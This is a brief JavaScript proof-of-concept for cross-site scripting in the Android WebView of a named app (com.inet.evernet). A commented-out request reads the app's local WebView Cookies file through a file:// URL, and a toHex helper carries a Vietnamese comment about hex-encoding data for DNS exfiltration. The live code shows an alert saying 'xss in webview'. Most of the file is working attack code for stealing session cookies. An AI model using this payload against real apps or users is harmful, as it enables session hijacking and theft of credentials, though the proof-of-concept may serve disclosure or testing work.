function toHex(str) { //request DNS sẽ lowercase tất cả ký tự nên những dữ liệu có ký tự in hoa thì cần chuyển thành hex
    var result = '';
    for (var i=0; i<str.length; i++) {
      result += str.charCodeAt(i).toString(16);
    }
    return result;
}
/*
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        alert(toHex(xhr.responseText));
    }
}
xhr.open('GET', 'file:///data/data/com.inet.evernet/app_webview/Default/Cookies', true);
xhr.send(null);
*/
alert("xss in webview");
